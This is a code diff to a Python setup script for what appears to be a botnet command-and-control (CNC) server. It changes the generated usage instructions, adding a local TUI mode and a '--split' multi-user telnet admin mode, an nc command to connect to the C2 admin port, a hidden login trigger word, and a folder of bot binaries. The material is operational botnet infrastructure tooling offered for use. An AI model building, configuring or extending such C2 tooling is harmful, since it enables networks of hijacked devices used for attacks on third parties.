@@ -560,12 +560,21 @@ def save_config(base_path: str, config: dict):
         f.write(f"Valid Days: {config['cert']['days']}\n\n")
 
         f.write("[Usage]\n")
-        f.write("1. Start CNC: ./server\n")
+        f.write("1. Start CNC (TUI mode):   ./server\n")
+        f.write("2. Start CNC (split mode): ./server --split\n")
         f.write(
-            f"2. Connect Admin(multi user mode): nc {config['c2_address'].split(':')[0]} {config['admin_port']}\n"
+            f"3. Connect Admin (split mode): nc {config['c2_address'].split(':')[0]} {config['admin_port']}\n"
         )
-        f.write("3. Login trigger(multi user mode): spamtec\n")
-        f.write("4. Bot binaries: bins/\n")
+        f.write("4. Login trigger (split mode): spamtec\n")
+        f.write("5. Bot binaries: bins/\n")
+        f.write("\n")
+        f.write("[Modes]\n")
+        f.write(
+            "TUI Mode (default): Local interactive terminal UI, no telnet server needed\n"
+        )
+        f.write(
+            "Split Mode (--split): Starts telnet admin server for multi-user remote access\n"
+        )
 
     return config_path
 
@@ -591,9 +600,20 @@ def print_summary(config: dict):
     print()
 
     print(f"{Colors.BRIGHT_CYAN}  Quick Start:{Colors.RESET}")
-    print(f"    Start CNC:    {Colors.GREEN}screen ./server{Colors.RESET}")
+    print(
+        f"    TUI Mode:     {Colors.GREEN}./server{Colors.RESET}           (local interactive UI)"
+    )
+    print(
+        f"    Split Mode:   {Colors.GREEN}./server --split{Colors.RESET}   (multi-user telnet)"
+    )
     c2_ip = config.get("c2_address", "localhost:443").split(":")[0]
     admin_port = config.get("admin_port", "420")
+    print(
+        f"    Admin Login:  {Colors.GREEN}nc {c2_ip} {admin_port}{Colors.RESET}  (split mode only)"
+    )
+    print(
+        f"    Login Trigger:{Colors.GREEN} spamtec{Colors.RESET}            (split mode only)"
+    )
     print(f"    Bot bins:     {Colors.GREEN}bins/{Colors.RESET}")
     print()
 
